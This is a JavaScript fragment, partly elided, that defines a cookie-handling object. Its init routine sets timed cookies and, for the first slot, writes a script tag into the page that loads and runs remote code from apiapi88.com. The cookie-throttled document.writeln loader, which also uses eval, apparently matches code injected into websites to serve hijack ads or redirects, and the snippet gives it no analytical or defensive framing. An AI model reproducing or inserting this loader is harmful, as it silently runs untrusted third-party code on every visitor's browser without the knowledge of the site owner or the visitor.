...
var cookie = {
	...
	init : function(){
		for(var i=0; i<cookie.ad_num; i++){
			if(cookie.get_cookie('asd1_cookie_'+i)){
				continue;
			}else{
				var Then = new Date();current_time = eval('cookie.ad'+i);Then.setTime(Then.getTime() + current_time*60*1000);document.cookie='asd1_cookie_'+i+'=1;expires='+ Then.toGMTString()+';path=/;';
				switch(i){
					case 0:
document.writeln("<script src=\'https://www.apiapi88.com/70a123.js\' type=\'text/javascript\'></script> ");
					break;
				}				
break;
			}
